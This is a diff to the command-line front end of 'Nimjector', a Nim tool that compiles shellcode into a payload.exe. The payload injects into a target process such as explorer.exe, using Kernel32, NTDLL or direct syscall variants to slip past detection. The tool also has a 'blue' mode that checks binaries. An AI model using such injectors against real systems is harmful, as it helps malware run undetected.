@@ -7,7 +7,6 @@ Nimjector v 1.0
 Usage:
   nimjector red -i <shellcode> -t <technique_name> [-P] [-p <process_name>] [-n]
   nimjector red -i <shellcode> -t <technique_name> [-P] [-p <process_name>] [-s] 
-  nimjector red -i <shellcode> -t <technique_name> [-P] [-p <process_name>] [-r] 
   nimjector red -i <shellcode> -t <technique_name> [-P] [-p <process_name>] [-g] 
   nimjector blue -f binary
   nimjector (-h | --help)
@@ -25,7 +24,6 @@ Options:
   -n --nt  			Use NTDLL calls instead of Kernel32
   -s --syscalls  		Use Syscalls via NimlineWhisphers2
   -g --gstub   			Use GetSyscallStub
-  -r --randomized  		Use randomized calls (Kernel32, NTDLL, Syscalls, GetSyscallStub)
 """
 
 var template_output: string = "payload.nim"
@@ -33,18 +31,20 @@ var template_output: string = "payload.nim"
 let args = docopt(doc, version = "Nimjector 1.0")
 let technique_list = get_techniques("models/techniques.yml")
 
-echo args
 # For payload creation
 if args["red"]:
   let technique = $args["--technique"]
   let shellcode_file = $args["--image"]
 
+  # For spawning remote processes
   var process = $args["--process"]
   if process == "nil":
      process = "explorer.exe"
- 
+
+  # Load shellcode 
   let shellcode = readFile(shellcode_file)
 
+  # API call variations
   var variation = "kernel32"   
   if args["--nt"]:
     variation = "ntdll"
@@ -52,8 +52,6 @@ if args["red"]:
     variation = "syscalls"
   if args["--gstub"]:
     variation = "gstub"
-  if args["--randomized"]:
-    variation = "randomized"
 
   var modules = get_modules(technique, variation)
   var setup = get_init_setup(technique, technique_list, variation)
@@ -71,7 +69,7 @@ if args["red"]:
     writeFile(template_output, payload)
     colored_print("[+] Payload written to payload.nim", fgGreen)
 
-    colored_print("[+] Compiling payload.nim", fgGreen)
+    colored_print(fmt"[+] Compiling payload.nim - {variation} variation", fgGreen)
     let res = os.execShellCmd("nim c payload.nim")
     if res == 0:
       colored_print("[+] Successfully compiled payload.exe", fgGreen)
@@ -82,10 +80,3 @@ if args["red"]:
 if args["blue"]:
   let bin = $args["--file"]
   process_binary(bin, technique_list)
-
-#build_template(technique, technique_list, template_output)
-
-# For binary checking
-#let technique_list = get_techniques("models/techniques.yml")
-
-#let arguments = custom_arguments("models/custom_arguments.yml")
